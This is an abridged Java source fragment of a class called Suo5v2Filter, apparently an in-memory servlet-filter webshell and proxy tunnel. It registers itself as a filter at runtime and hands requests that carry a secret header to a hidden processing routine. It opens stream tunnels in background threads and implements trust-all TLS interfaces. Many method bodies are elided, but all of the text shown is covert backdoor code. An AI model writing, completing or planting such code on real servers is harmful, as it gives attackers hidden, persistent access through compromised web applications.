...
public class Suo5v2Filter extends ClassLoader implements Filter, Runnable, HostnameVerifier, X509TrustManager {
    ...
    public Suo5v2Filter(ClassLoader c) {
        super(c);
    }

    public Suo5v2Filter(InputStream var1, OutputStream var2, String var3) {
        this.gInStream = var1;
        this.gOutStream = var2;
        this.gtunId = var3;
    }

    public Suo5v2Filter(String var1, int var2) {
        this.gtunId = var1;
        this.mode = var2;
    }
    ...
    public String addFilter() throws Exception {
        ...
        String filterName = "Suo5v2Filter" + this.path.replace("/", "_");
    ...
    public void doFilter(ServletRequest var1, ServletResponse var2, FilterChain var3) throws IOException, ServletException {
        ...
        try {
            if (var4.getHeader(headerName) != null && var4.getHeader(headerName).contains(headerValue)) {
                (new Suo5v2Filter()).process(var4, var5);
                return;
            }
    ...
    private void processFullStream(HttpServletRequest var1, HttpServletResponse var2, HashMap var3, String var4) throws Exception {
        ...
        try {
            ...
            Suo5v2Filter var14 = new Suo5v2Filter(var12, var13, var4);
    ...
    private byte[] performCreate(HttpServletRequest var1, HashMap var2, String var3, boolean var4) throws Exception {
        ...
        try {
            ...
            if (var4) {
                (new Thread(new Suo5v2Filter(var3, 1))).start();
                (new Thread(new Suo5v2Filter(var3, 2))).start();
            }
